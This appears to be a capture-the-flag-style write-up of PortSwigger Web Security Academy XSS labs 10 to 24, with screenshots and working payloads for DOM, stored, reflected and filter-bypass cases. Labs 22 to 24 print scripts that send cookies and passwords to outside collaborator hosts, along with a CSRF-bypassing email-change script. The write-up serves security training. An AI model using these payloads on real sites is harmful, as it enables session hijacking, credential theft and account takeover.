## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Cross-site scripting (XSS)**:

**10 DOM XSS in document.write sink using source location.search inside a select element**  
<blockquote>
This lab demonstrates DOM XSS occurring via <code>document.write()</code> using URL parameters inside a &lt;select&gt; element context.
</blockquote>


**11 DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**  
<blockquote>
This lab explores how AngularJS expressions can be exploited despite HTML encoding of angle brackets and double quotes.
</blockquote>

**12 Reflected DOM XSS**  
<blockquote>
This lab shows reflected DOM-based XSS vulnerabilities where user input is unsafely handled in the DOM.
</blockquote>

**13 Stored DOM XSS**  
<blockquote>
This lab covers stored DOM XSS vulnerabilities where malicious scripts are persistently injected and executed.
</blockquote>

**14 Reflected XSS into HTML context with most tags and attributes blocked**  
<blockquote>
This lab demonstrates reflected XSS where most HTML tags and attributes are blocked but exploitation remains possible.
</blockquote>

**15 Reflected XSS into HTML context with all tags blocked except custom ones**  
<blockquote>
This lab shows how attackers can leverage allowed custom tags to carry out reflected XSS attacks.
</blockquote>

**16 Reflected XSS with some SVG markup allowed**  
<blockquote>
This lab explores XSS attacks exploiting allowed SVG markup.
</blockquote>


**17 Reflected XSS in canonical link tag**  
This lab demonstrates XSS via injection into the canonical link tag in the HTML header.

**18 Reflected XSS into a JavaScript string with single quote and backslash escaped** 
<blockquote>
This lab covers XSS where single quotes and backslashes are escaped but scripts still execute.
</blockquote>

**19 Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**  
<blockquote>
This lab shows reflected XSS despite multiple layers of encoding and escaping.
</blockquote>


**20 Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**  
<blockquote>
This lab demonstrates stored XSS exploiting encoded and escaped event handlers.
</blockquote>

**21 Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**  
<blockquote>
This lab shows advanced reflected XSS exploiting template literals despite Unicode escaping.
</blockquote>

**22 Exploiting cross-site scripting to steal cookies**  
<blockquote>
This lab demonstrates practical exploitation of XSS to steal session cookies.
</blockquote>

**23 Exploiting cross-site scripting to capture passwords**  
<blockquote>
lab shows how XSS can be used to capture user passwords from input fields.
</blockquote>

**24 Exploiting XSS to bypass CSRF defenses**  
<blockquote>
This lab explains how XSS vulnerabilities can be leveraged to bypass CSRF protections.
</blockquote>

---

### LAB 10 - DOM XSS in document.write sink using source location.search inside a select element

### Lab Description

![image](https://github.com/user-attachments/assets/bcab6293-1df9-45e8-9212-e3ad63ea1994)


### Solution

We press contrl+u annd see the sink which is shown below:

```

var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
![image](https://github.com/user-attachments/assets/0a738097-6c16-4cde-9bd4-73c752f5f911)

```

![image](https://github.com/user-attachments/assets/57262be2-32e1-4751-a2cc-fc9137427cab)

The parameter storeId is written between "" and "". That means if we add that value in the GET request it appears between the options, for example accessing `"/product?productId=4&storeId=1"`.

![image](https://github.com/user-attachments/assets/40b8b736-4dfd-4f7e-8775-ce39f7761496)

To escape the option tags we can use the payload:

```

</option><script>alert(1)</script><option selected>
/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>

```
![image](https://github.com/user-attachments/assets/4c9f4987-1e7a-4673-b67c-a5ea6c764e6c)

Lab is solved

---

### LAB 11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

### Lab Description

![image](https://github.com/user-attachments/assets/ca11cb0b-0e10-46b6-93b7-b5e61587ddbf)

### Solution

There is a search function on the website.

![image](https://github.com/user-attachments/assets/c312b12a-918d-4432-94e3-8ff49eb968cd)

The string is part of a h1 tag:

![image](https://github.com/user-attachments/assets/c696ee83-1724-4940-b6c2-bd9370a4a0e3)


Using curly-braces we find this payload is interpreted:

`{{1== 1 ? "Yes, it is equal" : "No, it is not"}}`

![image](https://github.com/user-attachments/assets/36eddae7-e2dd-4ed2-8123-233c02fd4c25)


I could pop an alert with the example from  https://stackoverflow.com/questions/66759842/what-does-object-constructor-constructoralert1-actually-do-in-javascript:

`{{constructor.constructor('alert(1)')()}}`
 
![image](https://github.com/user-attachments/assets/c4a58ef1-6b98-43bd-81e9-f23839c74271)


The official solution is similar: `{{$on.constructor('alert(1)')}}`

After alert lab will be solved

---

### LAB 12 - Reflected DOM XSS

### Lab Description

![image](https://github.com/user-attachments/assets/7c089b77-b6bf-44d8-9c8b-185790b12021)

### Solution

There is a Javascript script in **/resources/js/searchResults.js**, which is:

The sink inside ie below:

![image](https://github.com/user-attachments/assets/d80166c0-ef4d-4337-91d7-954ccdd657cf)

There is a request to `/search-results`.

![image](https://github.com/user-attachments/assets/5790b86a-5031-48ca-b5f3-5d14fcfc1071)


The response to `/search-results`:

![image](https://github.com/user-attachments/assets/4cadc89e-e4ca-4908-8dc8-97011c410216)


The correct payload from the solution:

`\"-alert(1)}//`

• Server adds \ to " so " becomes "".
• } closes the JSON object
// comments the rest of the object![image](https://github.com/user-attachments/assets/59d5fb11-e5a4-496f-92c9-529a25d42174)

![image](https://github.com/user-attachments/assets/7f653866-278b-46db-98c7-7e13200dbcdb)

And lab will be solved

---

### LAB 13 - Stored DOM XSS

### Lab Description

![image](https://github.com/user-attachments/assets/96f9f42a-eab9-4196-abca-4d99e0c1b100)


### Solution


It is possible to post comments on the website:


![image](https://github.com/user-attachments/assets/793b715d-c879-4fc4-ae05-69d612fcf4cf)


It generates the following HTML code:

![image](https://github.com/user-attachments/assets/fb665c61-bdf6-4e32-b3ba-775182caece9)

We can try the payload:

```
</p><img src=x onerror=alert(1) /><p></p>
```

![image](https://github.com/user-attachments/assets/1f92cf53-f49e-4fc2-950e-ed2ca75da966)

It pops an alert and lab will be solved:

![image](https://github.com/user-attachments/assets/2edf82cc-4739-438a-a140-0cc5aad8f64a)


---

### LAB 14 - Reflected XSS into HTML context with most tags and attributes blocked

### Lab Description

![image](https://github.com/user-attachments/assets/46be5b50-c3ed-43f6-b1a3-4b8356c5b3ac)

### Solution

The content of the search is reflected inside a h1 HTML element:

![image](https://github.com/user-attachments/assets/20ae0b1e-7d8e-4b30-803c-deff03d8637e)

If we try to add a tag **"h1"** it gets blocked:

![image](https://github.com/user-attachments/assets/18c31c42-d5bb-4c56-8984-ac6f8b02ed3a)

But not if it is **"h2"**:

![image](https://github.com/user-attachments/assets/05a2399b-6c9e-44a9-b51b-ac3e8a4d4177)

With this payload the HTML is generated correctly:

```
<h3>a</h3>
```

![image](https://github.com/user-attachments/assets/c9559de9-ade7-41ff-911a-3261fe7f2b0b)



With this payload it says “Attribute is not allowed”:

**<h3 onerror=alert(1)>a</h3>**

![image](https://github.com/user-attachments/assets/e793340a-44c5-4714-97d0-50a6a4deb121)

I sent it to Intruder and got all events from  `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`:

![image](https://github.com/user-attachments/assets/0e9f892f-1411-4e72-86c6-824dede468f5)

The only ones working:

	• onbeforeinput
	• onratechange
	• onscrollend
	• Onresize

![image](https://github.com/user-attachments/assets/908f3ec5-7e95-4ca2-a26a-8ba9bb2e817c)

I will do the same for the tags, in this case using Battery Ram attack type:

![image](https://github.com/user-attachments/assets/2781cd4a-8c82-4222-8b81-45a5f672ba75)

The only ones working:

• custom tags
• Body

![image](https://github.com/user-attachments/assets/b5106289-43ea-41be-a157-3fd0d082c2bc)


The information in the cheatsheet from these attributes is:

![image](https://github.com/user-attachments/assets/4cf0c932-fc89-42cf-ba32-66da4ef9b03a)


So we have 3 possible payloads, because as "audio" and “video” tags are not available we can not use "onratechange":

```

<xss contenteditable onbeforeinput=alert(1)>test
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
<body onresize="print()">

```

Regarding the **"onscrollend"** payload, I updated it because it can not use **“br”** or **“span”**. However, it is necessary to scroll to the top or the bottom to see the alert pop:

```

<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>

```


Regarding the “onbeforeinput” payload, it is necessary to click the text and update it for the alert to pop:

```
<xss contenteditable onbeforeinput=alert(1)>test</xss>

```
The third one is valid but it needs the user to change the size of the tab:

```
<body onresize="print()">

```

![image](https://github.com/user-attachments/assets/d72d82a5-9e87-400e-923b-33ab7057ec6e)

We will send this last one inside an iframe:

https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E

`?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%`

In order to solve the lab, there must not be user interaction to trigger the payload since it is sent to victim.
  The print command needs to be performed automatically without any user interaction. Therefore I need a way to enforce the resize event without requiring the victim to do it.So I include `onload=this.style.width='100px'` to automatically resize the page when it loads . This willl now trigger an XSS .
  
```
<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>

```
> URL-encode the entire search term to ensure nothing goes amiss inside the iframe.

Store & deliver exploit to victim to solve the lab.

![image](https://github.com/user-attachments/assets/e44b5827-8853-4538-9abb-c2cfa580d0a3)



### LAB 15 - Reflected XSS into HTML context with all tags blocked except custom ones

### Lab Description

   ![image](https://github.com/user-attachments/assets/06471240-9caf-44d4-bb6f-04770bbc9ee3)

 ### Solution

The search term is reflected in the page response embedded within `<h1>` tags.

![Search reflection](https://github.com/user-attachments/assets/3c41e4fe-28d4-4f06-8540-6d8d009d601b)

---

## Step 1: Intruder Payload

The payload sent to Intruder for testing:

```html
<tag attrib=alert(1)>text</tag>
````

---

## Step 2: Attribute Testing

We begin by testing which attributes are allowed:

![Attribute test](https://github.com/user-attachments/assets/2edb841d-9fab-41b5-b1dd-0a92659775be)

It seems all attributes are valid:

![All attributes valid](https://github.com/user-attachments/assets/7474e0e7-68ec-46e4-bfb3-379c863e8ed4)

---

## Step 3: Tag Testing

Testing various tag names:

![Tag test](https://github.com/user-attachments/assets/b33240e1-4df0-499f-9489-0c57a0ce1e49)

The following tag names are accepted:

* `animatetransform`
* `animatemotion`
* `custom tags`
* `animate`
* `iframe2`
* `audio2`
* `image2`
* `image3`
* `input2`
* `input3`
* `input4`
* `video2`
* `img2`
* `set`
* `a2`

Example:

![Custom tags](https://github.com/user-attachments/assets/6d55c811-e251-484c-a056-6df6a031ae07)

---

## Step 4: Executing XSS with Autofocus + onfocus

We use the following payload to trigger a pop-up using `autofocus` and `onfocus`:

```html
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

Encoded URL:

```
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E
```

Payload in action:

![Alert on focus](https://github.com/user-attachments/assets/3184d4ae-450a-45ac-89ef-799f579bce0a)

---

## Final Step: Deliver to Victim

Deliver the crafted exploit link to the victim. When they visit the page, the malicious payload will execute and the lab will be marked as solved.

---


### LAB 16 - Reflected XSS with some SVG markup allowed

### Lab Description

![image](https://github.com/user-attachments/assets/bc9877f8-3fc6-4cfc-b7ce-f53b2375149e)

### Solution

The content of the search is reflected inside a h1 HTML element:

<img width="434" height="109" alt="image" src="https://github.com/user-attachments/assets/f68a2f67-be8e-41ef-8e7b-53b0bdd63583" />

In this case it seems not even custom tags are allowed. I will test all possible tags:

<img width="1072" height="394" alt="image" src="https://github.com/user-attachments/assets/dd274db9-ed2d-4212-a9fd-23efbdbc9be2" />

 The valid tags are:

	• animatetransform
	• image
	• title
 <img width="694" height="155" alt="image" src="https://github.com/user-attachments/assets/0f1b231d-1f68-45ef-8dd4-efccff6cd015" />


And then all possible attributes:
	• Onbegin
 
<img width="718" height="134" alt="image" src="https://github.com/user-attachments/assets/c2272836-8c02-4372-a90b-78497884f581" />


We get this payload from  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet:


<img width="1292" height="175" alt="image" src="https://github.com/user-attachments/assets/9c996b2c-975a-4adc-9a64-92b9228a7c03" />

```

<svg><animatetransform onbegin=alert(1) attributeName=transform>

```

<img width="784" height="162" alt="image" src="https://github.com/user-attachments/assets/43832b6f-4790-4ad0-9c9b-d2d6f037996f" />

---

### LAB 17 - Reflected XSS in canonical link tag

### Lab Description

![image](https://github.com/user-attachments/assets/622d6b4c-9355-4fbc-9020-3b4962abcc40)

### Solution
To assist with your exploit, you can assume that the simulated user will press the following key combinations:
  ```
	• ALT+SHIFT+X
	• CTRL+ALT+X
	• Alt+X
  ```

Please note that the intended solution to this lab is only possible in Chrome.

<img width="1292" height="664" alt="image" src="https://github.com/user-attachments/assets/5e4e391c-b7ea-4c83-8718-2c9d4c98d673" />

The page allows to post comments:

<img width="973" height="805" alt="image" src="https://github.com/user-attachments/assets/b57a881f-407f-44ce-8807-d3d025972b86" />

We find the link with 'rel="canonical"' in the head section of the HTML page:

<img width="1109" height="149" alt="image" src="https://github.com/user-attachments/assets/6fc1d736-3702-4634-9fc8-faf97e887679" />

We would like to turn it to:

```
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

In the **/post** endpoint it is necessary to send a correct postId, but it is possible to add more parameters which change the content of the href attribute:


<img width="929" height="605" alt="image" src="https://github.com/user-attachments/assets/65c2e924-c2b0-4ea7-bb03-3596816cfd69" />

A correct payload:

`/post?postId=1&a=b'accesskey='X'onclick='alert(1)`

<img width="705" height="276" alt="image" src="https://github.com/user-attachments/assets/f10213e7-bf97-49b2-8d7f-7a064292c160" />

<img width="787" height="143" alt="image" src="https://github.com/user-attachments/assets/8b0090f3-d037-4faf-965e-e3831bdd3574" />

---

### LAB 18 - Reflected XSS into a JavaScript string with single quote and backslash escaped

### Lab Description

![image](https://github.com/user-attachments/assets/01e72f8d-2cbc-4508-a381-725c77363431)

### Solution

  <img width="963" height="522" alt="image" src="https://github.com/user-attachments/assets/6012f021-6b91-402f-a31f-9cbb235ce7ed" />

   The content of the search is reflected inside a h1 HTML element and a variable in Javascript with single quotes:

   <img width="921" height="264" alt="image" src="https://github.com/user-attachments/assets/72cc3ba0-d999-4eb9-9578-2ff557943135" />

   I used the payload:
  
  ```
  ';</script><img src=x onerror=alert(1)><script>var a='a

  ```
<img width="832" height="129" alt="image" src="https://github.com/user-attachments/assets/5e7910b5-831a-4530-bc26-8267a0b4b08e" />
<img width="963" height="97" alt="image" src="https://github.com/user-attachments/assets/3a017ab9-da7a-4128-9aae-f0085ca29b0f" />

---

### LAB 19 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

### Lab Description

![image](https://github.com/user-attachments/assets/d886ac0a-a6f0-4655-bf63-0e38fee9b364)



### Solution

<img width="1006" height="648" alt="image" src="https://github.com/user-attachments/assets/b6db7ced-2b66-402e-91e1-d23a5c86a221" />

The content of the search is reflected inside a h1 HTML element and a variable in Javascript with single quotes:

<img width="980" height="194" alt="image" src="https://github.com/user-attachments/assets/3a1153f7-4e3e-44dc-b65c-a1e577d115d7" />

A payload that works is:

```
 \';alert(1);//

 ```
<img width="870" height="143" alt="image" src="https://github.com/user-attachments/assets/cb9555c3-c198-4385-870e-cc29b23149e9" />


---

### LAB 20 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

### Lab Description

![image](https://github.com/user-attachments/assets/573d15ec-0c48-46d0-a167-7bbd84ae6bbb)

### Solution

<img width="1030" height="583" alt="image" src="https://github.com/user-attachments/assets/a7d33aa4-51d7-43a5-94ad-bb47a11676e9" />

There is a function to post comments:

<img width="883" height="669" alt="image" src="https://github.com/user-attachments/assets/c1cc8b49-330e-4529-8e25-105c644a689a" />

It generates the following HTML code:

<img width="1148" height="77" alt="image" src="https://github.com/user-attachments/assets/202a5b88-3d46-4d02-b643-b1bfb5c133a5" />

`a id="author" href="http://test4.com" onclick="var tracker={track(){}};tracker.track('http://test4.com');">test2</a>`

We see single quote and backslash characters are indeed escaped and angle brackets and double quotes are HTML-encoded:

<img width="448" height="402" alt="image" src="https://github.com/user-attachments/assets/f4d95a21-5244-4d2f-909f-7e9faf049962" />


We will use “'” next:

`http://test4.com&apos;);alert(1);//`

```
POST /post/comment HTTP/2
...
csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//

```

When clicking the username an alert pops:

<img width="823" height="378" alt="image" src="https://github.com/user-attachments/assets/e4dfd703-cc79-44fc-8a42-7b123743b5ee" />

---


### LAB 21 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

### Lab Description

![image](https://github.com/user-attachments/assets/1f140f4b-d1ba-4296-84c5-bdf0bda87c69)

### Solution

<img width="911" height="593" alt="image" src="https://github.com/user-attachments/assets/26e0635f-bf44-4f48-b046-dff37309fbc5" />

The content of the search is reflected inside the variable “message”, a template literal:

<img width="480" height="85" alt="image" src="https://github.com/user-attachments/assets/51795be0-afe1-400a-9a6f-6056c5f62794" />

We can execute this payload inside the template literal:

```
${alert(1)}
```

<img width="639" height="246" alt="image" src="https://github.com/user-attachments/assets/cd170563-40ff-4937-9312-52f4c618b1cf" />

---

### LAB 22 - Exploiting cross-site scripting to steal cookies

### Lab Description

![image](https://github.com/user-attachments/assets/706142af-7678-416d-90cd-b418ff1cb068)

### Solution
First we test the XSS in one of the blog posts. This payload works:

`</p><img src=x onerror=alert(1) /><p>`

<img width="789" height="631" alt="image" src="https://github.com/user-attachments/assets/301650af-27a2-4d98-ba54-16ba054fc1ab" />

Next we try the payload:

`'document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie'`

```
</p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>

```

We receive cookies in Burp Collaborator:

<img width="1289" height="337" alt="image" src="https://github.com/user-attachments/assets/41892aa9-7ad8-4394-b896-81defde98e86" />



Then intercept the request to the Home page and add these cookies and we are authenticated as another user and lab will be solved:

<img width="627" height="347" alt="image" src="https://github.com/user-attachments/assets/30e8ed03-06cd-4279-9faa-47b6043fb501" />

<img width="828" height="338" alt="image" src="https://github.com/user-attachments/assets/75d0b17b-a7b0-49c5-826a-39f42c04d140" />


---

### LAB 23 - Exploiting cross-site scripting to capture passwords

### Lab Description

![image](https://github.com/user-attachments/assets/6ecb56df-86dc-48a8-a502-7fe39f3354ae)

### Solution

  We test the most simple XSS payload on comments:


    <img width="816" height="646" alt="image" src="https://github.com/user-attachments/assets/48627d45-caa8-448f-be62-24f874bea3f5" />

   It gets executed:

   Next we test a payload from  `https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md`:

    ```
    
    <script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>

    Or
 
   <img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">

    
       ```
<img width="722" height="615" alt="image" src="https://github.com/user-attachments/assets/bc35d05a-8ecf-4c66-8d06-a66fc022a104" />

 We get an HTTP request with the cookie:


 Next I opened the Firefox debugger's Console and set the cookie:

 `document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"`

<img width="483" height="121" alt="image" src="https://github.com/user-attachments/assets/d394799d-24f9-4ad3-b738-694d743adc6b" />

But that does not work...

Solution:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

```

<img width="775" height="639" alt="image" src="https://github.com/user-attachments/assets/7cbb1978-9829-4493-8da3-87bf3d687091" />

Collaborator response:

<img width="928" height="343" alt="image" src="https://github.com/user-attachments/assets/eb34d9d9-ccfb-4f5b-9410-ea434f75d28e" />

Solved with credentials **administrator:ec7ga43qyd9zisyb4h4i**


<img width="1046" height="363" alt="image" src="https://github.com/user-attachments/assets/bcd75845-72e3-43fc-a2f4-2880c3d49db1" />

---


### LAB 24 - Exploiting XSS to bypass CSRF defenses

### Lab Description

![image](https://github.com/user-attachments/assets/27bc896e-1013-40d2-af9d-b54fbe6c8273)

### Solution

<img width="902" height="340" alt="image" src="https://github.com/user-attachments/assets/be8ea6c9-455b-46c5-868a-73773a1eb0f1" />

There is a function to update the email:

<img width="769" height="320" alt="image" src="https://github.com/user-attachments/assets/9aab287f-8305-4e2e-aac8-5d34bef1cf2f" />

It is a POST message:

<img width="608" height="446" alt="image" src="https://github.com/user-attachments/assets/53321fc0-d727-4275-a83f-960352c9ebba" />

There is a function to post comments:

<img width="761" height="631" alt="image" src="https://github.com/user-attachments/assets/b5523b86-924f-4cb5-862a-c5ff07761c15" />



Submit the following payload (e.g., in a blog comment field):

```html
</p><img src=x onerror=alert(1) /><p>
````

Once submitted and viewed by a victim, the `alert(1)` will execute.

![Lab Solved](https://github.com/user-attachments/assets/fb11c714-7e83-45ac-8428-2a44afbb2c4b)


---

You can also escalate the attack by submitting the following **XSS-based CSRF** payload in the comment:


Now Stored below comment in blog then lab will be marked ad solve

```

<script>
    // Wait the window is fully loaded, otherwise the CSRF token will be empty
    window.onload = function (){
        // Fetch victim's CSRF token
        var csrfToken = document.getElementsByName("csrf")[0].value;
        var email = 'attacker@malicious.com';

        // Construct the require POST parameters
        var data = 'email=' + email + '&';
        data += 'csrf=' + csrfToken;

        // Change victim's email upon visit via CSRF attack
        fetch('https://id.web-security-academy.net/my-account/change-email',
            {
                method: 'POST',
                mode: 'no-cors',
                body: data
            }
        )
    };
</script>

```

<img width="776" height="897" alt="image" src="https://github.com/user-attachments/assets/e3c2e5eb-935a-48c0-ad3b-0cf85eeffb04" />


<img width="1163" height="248" alt="image" src="https://github.com/user-attachments/assets/20f10f05-d180-4bc6-872e-bddbf3c7e425" />

---

